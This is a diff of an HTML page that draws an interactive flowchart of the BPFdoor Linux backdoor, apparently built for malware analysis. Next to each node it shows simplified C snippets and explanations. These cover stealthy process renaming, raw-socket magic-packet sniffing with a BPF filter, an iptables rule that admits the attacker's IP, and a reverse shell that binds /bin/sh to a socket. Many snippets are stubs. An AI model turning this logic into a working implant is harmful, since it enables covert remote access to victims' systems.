@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <title>BPFdoor Full Architecture (Interactive Editable)</title>
-  <link href="https://cdn.jsdelivr.net/gh/jerosoler/Drawflow/dist/drawflow.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/gh/jerosoler/Drawflow/dist/drawflow.min.js"></script>
+  <link href="https://cdn.jsdelivr.net/gh/jerosoler/Drawflow/dist/drawflow.min.css" rel="stylesheet">  
   <style>
     body { margin: 0; background: #f0f2f5; font-family: sans-serif; }
     #drawflow { width: 100%; height: 95vh; background: #fff; }
@@ -15,109 +16,562 @@
       font-size: 14px;
     }
     .drawflow-node:hover { cursor: pointer; }
-    .inputs, .outputs {
-      width: 100%;
-      height: 10px;
-      margin-top: 5px;
+    .connection .main-path {
+      stroke: #0074D9;
+      stroke-width: 3px;
+    }
+    .connection .point {
+      fill: #0074D9;
+    }
+    .drawflow .connection .main-path {
+      stroke-width: 3px;  /* Make connections more visible */
+    }
+    h2 {
+      margin: 10px 0;
+      text-align: center;
+    }
+    .controls {
+      display: flex;
+      justify-content: center;
+      margin: 10px 0;
+    }
+    .controls button {
+      margin: 0 5px;
+      padding: 5px 10px;
+      background: #0074D9;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .controls button:hover {
+      background: #0063b6;
+    }
+    .main-layout {
+      display: flex;
+      height: 90vh;
+    }
+    #drawflow {
+      flex: 2;
+      min-width: 0;
+    }
+    #code-preview {
+      flex: 1;
+      background: #222;
+      color: #eee;
+      padding: 20px;
+      overflow: auto;
+      border-left: 2px solid #0074D9;
+      display: flex;
+      flex-direction: column;
+    }
+    #code-content {
+      background: #222;
+      color: #eee;
+      font-family: monospace;
+      font-size: 13px;
+      margin-bottom: 10px;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    #code-explanation {
+      font-size: 14px;
+      color: #b3e5fc;
     }
   </style>
 </head>
 <body>
 
-<h2 style="text-align:center">BPFdoor Full Architecture (Interactive Editable)</h2>
-<div id="drawflow"></div>
+<h2>BPFdoor Full Architecture (Interactive Editable)</h2>
+<div class="controls">
+  <button id="zoom-in">Zoom In</button>
+  <button id="zoom-out">Zoom Out</button>
+  <button id="zoom-reset">Reset Zoom</button>
+  <button id="preview-mode">Preview Mode</button>
+</div>
+<div class="main-layout">
+  <div id="drawflow"></div>
+  <div id="code-preview">
+    <pre id="code-content">// Code will appear here</pre>
+    <div id="code-explanation"></div>
+  </div>
+</div>
 
-<script src="https://cdn.jsdelivr.net/gh/jerosoler/Drawflow/dist/drawflow.min.js"></script>
 <script>
-  document.addEventListener("DOMContentLoaded", function() {
-    var editor = new Drawflow(document.getElementById('drawflow'));
+  window.onload = function() {
+    console.log("Window loaded, Drawflow available:", typeof Drawflow !== 'undefined');
+    
+    // Create editor instance
+    var container = document.getElementById("drawflow");
+    var editor = new Drawflow(container);
+    
     editor.reroute = true;
     editor.start();
+    
+    // Debug log
+    console.log("Editor created:", editor);
 
-    function addNode(name, inputs, outputs, x, y, info) {
-      editor.addNode(name, inputs, outputs, x, y, name, {info: info},
-        `<div style='text-align:center;'>
-          <div class='title'><b>${name}</b></div>
-          <div class='drawflow-content'>
-            <small id='info-${name}'>${info}</small><br/>
-            <button onclick='editInfo("${name}")'>Edit</button>
-          </div>
-          <div class='inputs'></div>
-          <div class='outputs'></div>
-        </div>`
-      );
-    }
+    // Set up controls
+    document.getElementById('zoom-in').addEventListener('click', function() {
+      editor.zoom_in();
+    });
+    document.getElementById('zoom-out').addEventListener('click', function() {
+      editor.zoom_out();
+    });
+    document.getElementById('zoom-reset').addEventListener('click', function() {
+      editor.zoom_reset();
+    });
+    document.getElementById('preview-mode').addEventListener('click', function() {
+      editor.editor_mode = editor.editor_mode === 'edit' ? 'fixed' : 'edit';
+      this.innerText = editor.editor_mode === 'edit' ? 'Preview Mode' : 'Edit Mode';
+    });
 
-    window.editInfo = function(name) {
-      let newInfo = prompt("Enter new info for " + name);
+    // Edit node info function
+    window.editInfo = function(id) {
+      var node = editor.getNodeFromId(id);
+      var currentInfo = document.getElementById('info-' + id).innerText;
+      var newInfo = prompt("Enter new info for " + node.name, currentInfo);
       if (newInfo !== null) {
-        document.getElementById("info-" + name).innerText = newInfo;
-        editor.drawflow.Home.data[name].data.info = newInfo;
+        document.getElementById('info-' + id).innerText = newInfo;
       }
-    }
+    };
 
-    // Define nodes with input/output counts
+    // Define nodes - Updated for vertical layout
     const nodes = [
-      ['main()', 0, 1, 50, 50, 'Program entry point'],
-      ['Initialisation', 1, 1, 300, 50, 'hash, hash2, self[], pid_path'],
-      ['Check pid_path', 1, 1, 550, 50, 'Check if PID file exists'],
-      ['Exit if exists', 1, 1, 800, 50, 'Exit if PID file found'],
-      ['Check root', 1, 1, 1050, 50, 'Ensure user is root'],
-      ['Exit if not root', 1, 1, 1300, 50, 'Exit if not root'],
-      ['Check argc==1', 1, 1, 1550, 50, 'Run to_open() if only program name'],
-      ['Set mask/password', 1, 1, 1800, 50, 'Randomise process mask, set passwords'],
-      ['Setup time/name', 1, 1, 2050, 50, 'setup_time() and set_proc_name()'],
-      ['Fork daemon', 1, 2, 2300, 50, 'Create background daemon'],
-      ['Parent exits', 1, 0, 2550, 0, 'Parent process exits'],
-      ['Child sets signals', 1, 1, 2550, 100, 'Init signals, write pid'],
-      ['Detach session', 1, 1, 2800, 50, 'setsid() and session detach'],
-      ['Enter packet_loop()', 1, 2, 3050, 50, 'Start listening to network packets'],
-      ['Create Socket', 1, 0, 3300, 0, 'Create raw socket + BPF filter'],
-      ['Packet Sniff Loop', 0, 1, 3300, 100, 'recvfrom() packets'],
-      ['Parse Packet', 1, 1, 3550, 50, 'Parse IP/TCP/UDP/ICMP'],
-      ['Check Magic Packet', 1, 1, 3800, 50, 'Identify control packets'],
-      ['Fork to Handle', 1, 3, 4050, 50, 'Fork child to handle magic packet'],
-      ['Authenticated (pass2)', 1, 1, 4300, 0, 'getshell() - iptables + spawn shell'],
-      ['Authenticated (pass)', 1, 1, 4300, 100, 'try_link() and shell()'],
-      ['Unauthenticated', 1, 0, 4300, 200, 'mon() - send UDP response'],
-      ['getshell()', 1, 1, 4550, 0, 'Setup firewall and spawn shell'],
-      ['shell()', 1, 0, 4800, 0, 'Encrypted comms via pty and /bin/sh']
+      { id: 1, name: 'main()', inputs: 0, outputs: 1, pos_x: 600, pos_y: 50, info: 'Program entry point' },
+      { id: 2, name: 'Initialisation', inputs: 1, outputs: 1, pos_x: 600, pos_y: 150, info: 'hash, hash2, self[], pid_path' },
+      { id: 3, name: 'Check pid_path', inputs: 1, outputs: 1, pos_x: 600, pos_y: 250, info: 'Check if PID file exists' },
+      { id: 4, name: 'Exit if exists', inputs: 1, outputs: 1, pos_x: 600, pos_y: 350, info: 'Exit if PID file found' }, // Assuming linear flow here for simplicity
+      { id: 5, name: 'Check root', inputs: 1, outputs: 1, pos_x: 600, pos_y: 450, info: 'Ensure user is root' },
+      { id: 6, name: 'Exit if not root', inputs: 1, outputs: 1, pos_x: 600, pos_y: 550, info: 'Exit if not root' }, // Linear flow
+      { id: 7, name: 'Check argc==1', inputs: 1, outputs: 1, pos_x: 600, pos_y: 650, info: 'Run to_open() if only program name' },
+      { id: 8, name: 'Set mask/password', inputs: 1, outputs: 1, pos_x: 600, pos_y: 750, info: 'Randomise process mask, set passwords' },
+      { id: 9, name: 'Setup time/name', inputs: 1, outputs: 1, pos_x: 600, pos_y: 850, info: 'setup_time() and set_proc_name()' },
+      { id: 10, name: 'Fork daemon', inputs: 1, outputs: 2, pos_x: 600, pos_y: 950, info: 'Create background daemon' },
+      { id: 11, name: 'Parent exits', inputs: 1, outputs: 0, pos_x: 800, pos_y: 1050, info: 'Parent process exits' }, // Branch Right
+      { id: 12, name: 'Child sets signals', inputs: 1, outputs: 1, pos_x: 600, pos_y: 1050, info: 'Init signals, write pid' }, // Branch Left (main flow)
+      { id: 13, name: 'Detach session', inputs: 1, outputs: 1, pos_x: 600, pos_y: 1150, info: 'setsid() and session detach' },
+      { id: 14, name: 'Enter packet_loop()', inputs: 1, outputs: 2, pos_x: 600, pos_y: 1250, info: 'Start listening to network packets' },
+      { id: 15, name: 'Create Socket', inputs: 1, outputs: 0, pos_x: 800, pos_y: 1350, info: 'Create raw socket + BPF filter' }, // Branch Right
+      { id: 16, name: 'Packet Sniff Loop', inputs: 1, outputs: 1, pos_x: 600, pos_y: 1350, info: 'recvfrom() packets' }, // Branch Left (main flow)
+      { id: 17, name: 'Parse Packet', inputs: 1, outputs: 1, pos_x: 600, pos_y: 1450, info: 'Parse IP/TCP/UDP/ICMP' },
+      { id: 18, name: 'Check Magic Packet', inputs: 1, outputs: 1, pos_x: 600, pos_y: 1550, info: 'Identify control packets' },
+      { id: 19, name: 'Fork to Handle', inputs: 1, outputs: 3, pos_x: 600, pos_y: 1650, info: 'Fork child to handle magic packet' },
+      { id: 20, name: 'Authenticated (pass2)', inputs: 1, outputs: 1, pos_x: 400, pos_y: 1750, info: 'getshell() - iptables + spawn shell' }, // Branch Left
+      { id: 21, name: 'Authenticated (pass)', inputs: 1, outputs: 1, pos_x: 600, pos_y: 1750, info: 'try_link() and shell()' },   // Branch Center
+      { id: 22, name: 'Unauthenticated', inputs: 1, outputs: 0, pos_x: 800, pos_y: 1750, info: 'mon() - send UDP response' }, // Branch Right
+      { id: 23, name: 'getshell()', inputs: 1, outputs: 1, pos_x: 400, pos_y: 1850, info: 'Setup firewall and spawn shell' }, // Continues from 20
+      { id: 24, name: 'shell()', inputs: 2, outputs: 0, pos_x: 500, pos_y: 1950, info: 'Encrypted comms via pty and /bin/sh' } // Merges from 21 and 23
     ];
 
-    nodes.forEach(n => addNode(...n));
+    // Add nodes to the editor
+    nodes.forEach(function(node) {
+      var html = `
+        <div style="text-align:center;">
+          <div><b>${node.name}</b></div>
+          <div>
+            <small id="info-${node.id}">${node.info}</small><br>
+            <button onclick="editInfo(${node.id})">Edit</button>
+            <button onclick="showCode(${node.id})">Code</button>
+          </div>
+        </div>`;
+      
+      editor.addNode(
+        node.id.toString(),
+        node.inputs,
+        node.outputs,
+        node.pos_x,
+        node.pos_y,
+        node.name,
+        {},
+        html,
+        false
+      );
+      
+      console.log(`Added node: ${node.id} - ${node.name}`);
+    });
 
-    // Define connections with explicit ports
-    const connections = [
-      ['main()', 'Initialisation', 'output_1', 'input_1'],
-      ['Initialisation', 'Check pid_path', 'output_1', 'input_1'],
-      ['Check pid_path', 'Exit if exists', 'output_1', 'input_1'],
-      ['Exit if exists', 'Check root', 'output_1', 'input_1'],
-      ['Check root', 'Exit if not root', 'output_1', 'input_1'],
-      ['Exit if not root', 'Check argc==1', 'output_1', 'input_1'],
-      ['Check argc==1', 'Set mask/password', 'output_1', 'input_1'],
-      ['Set mask/password', 'Setup time/name', 'output_1', 'input_1'],
-      ['Setup time/name', 'Fork daemon', 'output_1', 'input_1'],
-      ['Fork daemon', 'Parent exits', 'output_1', 'input_1'],
-      ['Fork daemon', 'Child sets signals', 'output_2', 'input_1'],
-      ['Child sets signals', 'Detach session', 'output_1', 'input_1'],
-      ['Detach session', 'Enter packet_loop()', 'output_1', 'input_1'],
-      ['Enter packet_loop()', 'Create Socket', 'output_1', 'input_1'],
-      ['Enter packet_loop()', 'Packet Sniff Loop', 'output_2', 'input_1'],
-      ['Packet Sniff Loop', 'Parse Packet', 'output_1', 'input_1'],
-      ['Parse Packet', 'Check Magic Packet', 'output_1', 'input_1'],
-      ['Check Magic Packet', 'Fork to Handle', 'output_1', 'input_1'],
-      ['Fork to Handle', 'Authenticated (pass2)', 'output_1', 'input_1'],
-      ['Fork to Handle', 'Authenticated (pass)', 'output_2', 'input_1'],
-      ['Fork to Handle', 'Unauthenticated', 'output_3', 'input_1'],
-      ['Authenticated (pass2)', 'getshell()', 'output_1', 'input_1'],
-      ['getshell()', 'shell()', 'output_1', 'input_1'],
-      ['Authenticated (pass)', 'shell()', 'output_1', 'input_1']
-    ];
+    // Define connections - wait for nodes to be created
+    setTimeout(function() {
+      console.log("Adding connections...");
+      
+      const connections = [
+        {source: '1', target: '2', output_index: 1, input_index: 1},
+        {source: '2', target: '3', output_index: 1, input_index: 1},
+        {source: '3', target: '4', output_index: 1, input_index: 1},
+        {source: '4', target: '5', output_index: 1, input_index: 1},
+        {source: '5', target: '6', output_index: 1, input_index: 1},
+        {source: '6', target: '7', output_index: 1, input_index: 1},
+        {source: '7', target: '8', output_index: 1, input_index: 1},
+        {source: '8', target: '9', output_index: 1, input_index: 1},
+        {source: '9', target: '10', output_index: 1, input_index: 1},
+        {source: '10', target: '11', output_index: 1, input_index: 1},
+        {source: '10', target: '12', output_index: 2, input_index: 1},
+        {source: '12', target: '13', output_index: 1, input_index: 1},
+        {source: '13', target: '14', output_index: 1, input_index: 1},
+        {source: '14', target: '15', output_index: 1, input_index: 1},
+        {source: '14', target: '16', output_index: 2, input_index: 1},
+        {source: '16', target: '17', output_index: 1, input_index: 1},
+        {source: '17', target: '18', output_index: 1, input_index: 1},
+        {source: '18', target: '19', output_index: 1, input_index: 1},
+        {source: '19', target: '20', output_index: 1, input_index: 1},
+        {source: '19', target: '21', output_index: 2, input_index: 1},
+        {source: '19', target: '22', output_index: 3, input_index: 1},
+        {source: '20', target: '23', output_index: 1, input_index: 1},
+        {source: '23', target: '24', output_index: 1, input_index: 1},
+        {source: '21', target: '24', output_index: 1, input_index: 2}
+      ];
+      
+      connections.forEach(function(conn) {
+        try {
+          editor.addConnection(
+            conn.source,
+            conn.target,
+            `output_${conn.output_index}`,
+            `input_${conn.input_index}`
+          );
+          console.log(`Added connection: ${conn.source} → ${conn.target}`);
+        } catch (err) {
+          console.error(`Error adding connection ${conn.source} → ${conn.target}:`, err);
+        }
+      });
+      
+      // Force a redraw
+      editor.updateConnectionNodes();
+      
+    }, 500);
+    
+    // Output editor state
+    console.log("Editor initialized with module:", editor.drawflow.Home);
+  };
 
-    connections.forEach(c => editor.addConnection(c[0], c[1], c[2], c[3]));
-    // Redraw
-    editor.drawflow.draw();
-  });
+  // Map node IDs to code and explanations
+  const codeSnippets = {
+    1: {
+      code: `int main(int argc, char *argv[]) {
+  // ... initialization ...
+  if (check_pid_file() != 0) return 1;
+  if (check_root() != 0) return 1;
+  if (argc > 1) { /* handle args */ } else { to_open(); }
+  setup_passwords_and_mask();
+  setup_time_and_proc_name();
+  if (fork_daemon() == 0) { // Child process
+    setup_signals_and_pid();
+    detach_session();
+    packet_loop();
+  }
+  // Parent exits
+  return 0;
+}`,
+      explanation: "Program entry point. Performs initial checks, sets up environment, forks into a daemon process, and the child enters the main packet loop."
+    },
+    2: {
+      code: `bzero(&cfg, sizeof(cfg));
+srand((unsigned)time(NULL));
+// Select a random mask from predefined strings
+strcpy(cfg.mask, self[rand()%10]); 
+// Set hardcoded passwords (hashes)
+strcpy(cfg.pass, hash);
+strcpy(cfg.pass2, hash2);`,
+      explanation: "Initializes configuration structure (`cfg`), seeds the random number generator, randomly selects a process name mask, and copies the predefined password hashes into the config."
+    },
+    3: {
+      code: `int check_pid_file() {
+  snprintf(pid_path, sizeof(pid_path), "/var/run/%s.pid", cfg.mask);
+  int fd = open(pid_path, O_RDONLY);
+  if (fd >= 0) {
+    close(fd);
+    return 1; // File exists
+  }
+  return 0; // File does not exist
+}`,
+      explanation: "Constructs the PID file path using the randomized mask (e.g., `/var/run/[random_mask].pid`). Attempts to open the file; if successful, it means another instance might be running, so it returns an error code."
+    },
+    4: {
+      code: `if (check_pid_file() != 0) {
+  // Log error or simply exit
+  exit(1);
+}`,
+      explanation: "If `check_pid_file()` indicates the PID file exists (returns non-zero), the program exits immediately to prevent multiple instances."
+    },
+    5: {
+      code: `int check_root() {
+  if (getuid() != 0 && geteuid() != 0) {
+    return 1; // Not root
+  }
+  return 0; // Is root
+}`,
+      explanation: "Checks if the real user ID (`getuid`) or the effective user ID (`geteuid`) is 0 (which corresponds to the root user). Returns non-zero if the user is not root."
+    },
+    6: {
+      code: `if (check_root() != 0) {
+  // Log error or simply exit
+  exit(1);
+}`,
+      explanation: "If `check_root()` indicates the user is not root (returns non-zero), the program exits."
+    },
+    7: {
+      code: `if (argc == 1) {
+  // No command-line arguments provided besides program name
+  to_open(); 
+} else {
+  // Handle command-line arguments (e.g., install, uninstall)
+  // ...
+}`,
+      explanation: "Checks if the program was run without any additional command-line arguments (`argc == 1`). If so, it calls `to_open()` (which might perform self-deletion or other setup). Otherwise, it would handle provided arguments."
+    },
+    8: {
+      code: `void setup_passwords_and_mask() {
+  // Already done in Initialisation (Node 2) - conceptually grouped here
+  // srand((unsigned)time(NULL));
+  // strcpy(cfg.mask, self[rand()%10]); 
+  // strcpy(cfg.pass, hash);
+  // strcpy(cfg.pass2, hash2);
+  
+  // Set process mask using prctl (if available)
+  prctl(PR_SET_NAME, cfg.mask);
+}`,
+      explanation: "This step logically follows argument checking. It ensures the process mask (name shown in `ps`, `top`, etc.) is set using `prctl` based on the randomly chosen string from Node 2. Password setting also conceptually belongs here but happened earlier."
+    },
+    9: {
+      code: `void setup_time_and_proc_name() {
+  setup_time(); // Might adjust system time or internal timers
+  set_proc_name(argv[0]); // Modify argv[0] to further hide process name
+}`,
+      explanation: "Calls `setup_time()` which could involve time manipulation. Calls `set_proc_name()` to overwrite the process name in memory (visible via `/proc/[pid]/cmdline`) for additional stealth."
+    },
+    10: {
+       code: `pid_t fork_daemon() {
+  pid_t pid = fork();
+  if (pid < 0) { /* handle error */ exit(1); }
+  if (pid > 0) { 
+    // Parent process
+    exit(0); // Parent exits successfully
+  }
+  // Child process continues
+  return 0;
+}`,
+      explanation: "Uses `fork()` to create a child process. The parent process immediately exits (`exit(0)`), leaving the child process to run in the background (daemonization)."
+    },
+    11: {
+      code: `// In parent process after fork:
+if (pid > 0) { 
+  exit(0); 
+}`,
+      explanation: "The original parent process successfully forked the child daemon and exits cleanly."
+    },
+    12: {
+      code: `void setup_signals_and_pid() {
+  // Ignore or handle specific signals (SIGHUP, SIGTERM, etc.)
+  signal(SIGPIPE, SIG_IGN); // Ignore broken pipe
+  // ... other signal handlers ...
+
+  // Create and write PID to the file
+  int fd = open(pid_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+  if (fd >= 0) {
+    char pid_str[16];
+    snprintf(pid_str, sizeof(pid_str), "%d", getpid());
+    write(fd, pid_str, strlen(pid_str));
+    close(fd);
+  }
+}`,
+      explanation: "The child (daemon) process sets up signal handlers (e.g., ignores `SIGPIPE`) to ensure stability. It then creates the PID file (checked in Node 3) and writes its own process ID into it."
+    },
+    13: {
+      code: `void detach_session() {
+  // Become session leader
+  if (setsid() < 0) { /* handle error */ exit(1); }
+
+  // Optional: Change working directory to root
+  chdir("/");
+
+  // Optional: Redirect standard I/O to /dev/null
+  int fd = open("/dev/null", O_RDWR);
+  if (fd >= 0) {
+    dup2(fd, STDIN_FILENO);
+    dup2(fd, STDOUT_FILENO);
+    dup2(fd, STDERR_FILENO);
+    close(fd);
+  }
+}`,
+      explanation: "The daemon process detaches itself from the controlling terminal by creating a new session using `setsid()`. It may also change its working directory and redirect standard input/output/error streams to `/dev/null`."
+    },
+    14: {
+       code: `void packet_loop() {
+  int sock = create_raw_socket();
+  if (sock < 0) { /* handle error */ return; }
+  
+  char buffer[BUFSIZE];
+  struct sockaddr_storage src_addr;
+  socklen_t addr_len = sizeof(src_addr);
+
+  while (1) {
+    int len = recvfrom(sock, buffer, BUFSIZE, 0, (struct sockaddr*)&src_addr, &addr_len);
+    if (len < 0) { continue; } // Handle errors/interruptions
+
+    // Basic packet parsing (e.g., check protocol)
+    struct iphdr *iph = (struct iphdr*)buffer;
+    if (parse_packet(buffer, len, iph->protocol)) { // Returns true if it's a magic packet
+      handle_magic_packet(buffer, len, &src_addr);
+    }
+  }
+  close(sock);
+}`,
+      explanation: "The core loop. First, it creates a raw socket (Node 15). Then, it continuously calls `recvfrom()` to capture network packets (Node 16). For each packet, it calls `parse_packet()` (Node 17). If a magic packet is identified (Node 18), it calls `handle_magic_packet()` (Node 19)."
+    },
+    15: {
+      code: `int create_raw_socket() {
+  // Create raw socket (e.g., AF_PACKET or AF_INET with IPPROTO_RAW)
+  int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP)); 
+  // Or: int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // for specific protocol
+  if (sock < 0) { return -1; }
+
+  // Apply BPF filter (optional but recommended)
+  struct sock_fprog bpf_filter = { /* BPF instructions */ };
+  setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf_filter, sizeof(bpf_filter));
+
+  // Set promiscuous mode (optional)
+  // setsockopt(...);
+
+  return sock;
+}`,
+      explanation: "Creates a raw network socket using `socket()`. This allows capturing packets directly from the network interface. An optional BPF (Berkeley Packet Filter) can be attached using `setsockopt` to efficiently filter for specific packets (e.g., specific ports or protocols) in the kernel, reducing the workload."
+    },
+    16: {
+      code: `while (1) {
+  int len = recvfrom(sock, buffer, BUFSIZE, 0, (struct sockaddr*)&src_addr, &addr_len);
+  if (len > 0) {
+    // Packet received, proceed to parsing
+    parse_packet(buffer, len, ...);
+  }
+}`,
+      explanation: "Inside the `packet_loop`, this is the blocking call `recvfrom()` that waits for incoming network packets matching the socket's criteria (raw socket, possibly with BPF filter). When a packet arrives, its data is placed in `buffer`."
+    },
+    17: {
+      code: `int parse_packet(char *buffer, int len, int protocol) {
+  struct iphdr *iph = (struct iphdr *)buffer;
+  // Check minimum length for IP header
+  if (len < sizeof(struct iphdr)) { return 0; }
+
+  // Check protocol (TCP/UDP/ICMP)
+  if (protocol == IPPROTO_TCP) {
+    struct tcphdr *tcph = (struct tcphdr *)(buffer + iph->ihl*4);
+    // Check TCP header length, flags, ports, data payload
+    // ... check for magic pattern ...
+  } else if (protocol == IPPROTO_UDP) {
+    struct udphdr *udph = (struct udphdr *)(buffer + iph->ihl*4);
+    // Check UDP header length, ports, data payload
+    // ... check for magic pattern ...
+  } else if (protocol == IPPROTO_ICMP) {
+    struct icmphdr *icmph = (struct icmphdr *)(buffer + iph->ihl*4);
+    // Check ICMP type, code, data payload
+    // ... check for magic pattern ...
+  }
+  return is_magic; // Return true if magic pattern found
+}`,
+      explanation: "Takes the raw packet data and interprets the IP header. Based on the protocol field in the IP header, it then parses the corresponding transport layer header (TCP, UDP, or ICMP) to extract information like ports and potentially look for the 'magic' data pattern that signifies a command packet."
+    },
+    18: {
+      code: `// Inside parse_packet() after extracting data:
+char *payload = buffer + iph->ihl*4 + tcph->doff*4; // Example for TCP
+int payload_len = len - (iph->ihl*4 + tcph->doff*4);
+
+if (payload_len >= MAGIC_LEN && memcmp(payload, MAGIC_BYTES, MAGIC_LEN) == 0) {
+  // Further checks based on protocol/ports might be needed
+  // Check against cfg.pass or cfg.pass2 (potentially XORed/encrypted)
+  if (check_password(payload + MAGIC_LEN, cfg.pass) || 
+      check_password(payload + MAGIC_LEN, cfg.pass2)) {
+     return 1; // It's a valid magic packet
+  }
+}
+return 0; // Not a magic packet`,
+      explanation: "After parsing headers (Node 17), this logic extracts the actual data payload. It checks if the payload contains a specific predefined 'magic' byte sequence and potentially validates an embedded password against `cfg.pass` or `cfg.pass2`."
+    },
+    19: {
+      code: `void handle_magic_packet(char *buffer, int len, struct sockaddr_storage *src_addr) {
+  pid_t pid = fork();
+  if (pid < 0) { /* handle error */ return; }
+  if (pid == 0) {
+    // Child process handles the request
+    close(parent_socket); // Close listener socket in child
+
+    if (/* authenticated with pass2 */) {
+      getshell(src_addr);
+    } else if (/* authenticated with pass */) {
+      try_link_and_shell(src_addr);
+    } else {
+      mon(src_addr); // Unauthenticated response
+    }
+    exit(0); // Child exits after handling
+  }
+  // Parent process continues listening
+  waitpid(pid, NULL, WNOHANG); // Optional: Reap child immediately if finished
+}`,
+      explanation: "When a valid magic packet is received, the main daemon forks a new child process specifically to handle that request. The child closes the listening socket and, based on which password was used (or if none matched), calls `getshell` (Node 20/23), `try_link`/`shell` (Node 21/24), or `mon` (Node 22). The parent continues listening (returns to Node 16)."
+    },
+    20: {
+       code: `// In child handler process, after checking password == cfg.pass2:
+getshell(src_addr);`,
+      explanation: "If the magic packet was authenticated using the second password (`cfg.pass2`), the child handler process calls the `getshell()` function."
+    },
+    21: {
+       code: `// In child handler process, after checking password == cfg.pass:
+try_link(src_addr); // May attempt direct connection
+shell(src_addr, /* use pty */);`,
+      explanation: "If the magic packet used the first password (`cfg.pass`), the child handler calls `try_link()` (purpose unclear, maybe direct connect?) and then proceeds to the main `shell()` function (Node 24)."
+    },
+    22: {
+      code: `// In child handler process, if authentication failed or specific command:
+mon(src_addr);`,
+      explanation: "If the magic packet payload did not contain a valid password or indicated a simple monitoring request, the child handler calls `mon()`, which typically sends a simple UDP acknowledgement packet back to the source."
+    },
+    23: {
+       code: `void getshell(struct sockaddr_storage *peer_addr) {
+  // 1. Setup firewall rules (e.g., iptables) to allow connection from peer_addr
+  char cmd[256];
+  snprintf(cmd, sizeof(cmd), "iptables -I INPUT 1 -s %s -j ACCEPT", /* format peer_addr IP */);
+  system(cmd);
+
+  // 2. Spawn the shell (calls Node 24)
+  shell(peer_addr, /* use specific method */);
+  
+  // 3. Cleanup firewall rules (might happen in shell() exit or here)
+  snprintf(cmd, sizeof(cmd), "iptables -D INPUT -s %s -j ACCEPT", /* format peer_addr IP */);
+  system(cmd);
+}`,
+      explanation: "This function is called for `pass2` authentication. It first modifies the system's firewall (e.g., using `iptables`) to explicitly allow incoming connections from the attacker's IP address (`peer_addr`). Then, it calls the core `shell()` function (Node 24) to establish the reverse shell connection. It should ideally clean up the firewall rule afterwards."
+    },
+    24: {
+      code: `void shell(struct sockaddr_storage *peer_addr, bool use_pty) {
+  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  // connect(sockfd, ... peer_addr ...);
+
+  if (use_pty) {
+    // Create pseudo-terminal (pty)
+    // Fork, child sets up pty slave, dups fds to sockfd, execs /bin/sh
+    // Parent relays data between sockfd and pty master
+  } else {
+    // Simple redirection
+    // dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
+    // execve("/bin/sh", ...);
+  }
+  // ... encryption/decryption layer around reads/writes to sockfd ...
+  close(sockfd);
+}`,
+      explanation: "The final stage. This function establishes the actual reverse shell connection back to the attacker (`connect()`). It can operate in two modes: either using a pseudo-terminal (pty) for a more interactive shell experience or by simply redirecting the standard input/output/error of `/bin/sh` directly to the network socket. All communication over `sockfd` is likely encrypted/decrypted."
+    }
+  };
+
+  window.showCode = function(id) {
+    const snippet = codeSnippets[id];
+    if (snippet) {
+      document.getElementById('code-content').innerText = snippet.code;
+      document.getElementById('code-explanation').innerText = snippet.explanation;
+    } else {
+      document.getElementById('code-content').innerText = "// No code available for this node.";
+      document.getElementById('code-explanation').innerText = "";
+    }
+  };
 </script>
 
 </body>
